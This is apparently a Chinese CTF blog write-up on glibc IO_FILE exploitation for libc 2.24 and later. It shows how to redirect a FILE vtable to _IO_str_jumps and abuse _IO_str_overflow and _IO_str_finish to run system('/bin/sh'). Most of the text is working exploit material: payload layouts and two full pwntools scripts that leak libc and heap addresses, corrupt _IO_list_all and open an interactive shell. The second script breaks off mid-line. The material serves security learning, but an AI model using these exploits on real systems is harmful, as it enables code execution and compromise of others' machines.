<p>上面说了libc2.24以后不能伪造vtable了，主要是因为当使用vtable的时候就会对vtable进行范围检查，vtable得在这个范围内，虽说限制了vtable，但也存在漏洞，这个范围内也有很多我们可以利用的虚表，比如io_str_jumps或io_wfile_jumps他们里面也全部记录着函数指针，我们可以把vtable指向这两个地方比如io_str_jumps</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中_IO_str_overflow和IO_str_finish是我们主要利用的函数指针，_IO_str_overflow和IO_str_finish都存在相对地址调用，如_IO_str_overflow</p>
<h4 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h4><p><code>new_buf= (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>最后会调用fp+0xe0,然后参数是new_size,这个也是通过fp的内容计算出来的,下面是poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps</span><br><span class="line">fp+<span class="number">0xe0</span>=system</span><br></pre></td></tr></table></figure>

<p>题目构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">pay+= p64(<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">3</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>只要fp这样构造然后调用_IO_str_overflow的时候最后就会执行system(‘/bin/sh’),现在问题是如何伪造io_file_plus以及如何执行_IO_str_overflow</p>
<p>上面提到过的，io_file_plus的头结点储存在io_list_all里面，所以可以覆盖io_list_all为我们可以控制的一段内存，比如堆，也就是说我们伪造了stferr的io_file_plus，然后在这段内存中构造上面的内容就好了。</p>
<p>函数IO_flush_all_lockp 会刷新所有文件流，内部会调用vtable+0x10的函数，当把vtable覆盖成io_str_jumps后vtable+0x10就是_IO_str_overflow函数地址，所以只要调用io_flush_all_lockp就好了，在程序main函数返回或者执行exit(0)或者执行abort时会调用io_flush_all_lockp函数，所以在fake_io_file_plus后触发io_flush_all_lockp就好了。</p>
<p>这是_IO_str_overflow的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    <span class="comment"># payload=&#x27;\x00&#x27;*0x10+p64(0)+p64(1)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(binsh_addr)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xa8-0x10,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(3)+p64(0)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xc8,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+0x3e8360-0x8)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    edit(<span class="number">19</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="io-str-finish"><a href="#io-str-finish" class="headerlink" title="io_str_finish"></a>io_str_finish</h4><p>除了io_str_overflow以外io_str_finish这个函数指针也可以使用，也是通过io_flush_all_lockp函数这个函数调用的，只要让vtable=io_str_jumps-,这个函数调用的是fp+0xe8,在对应位置填上system_addr就行。然后fp的伪造也比io_str_overflow简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span 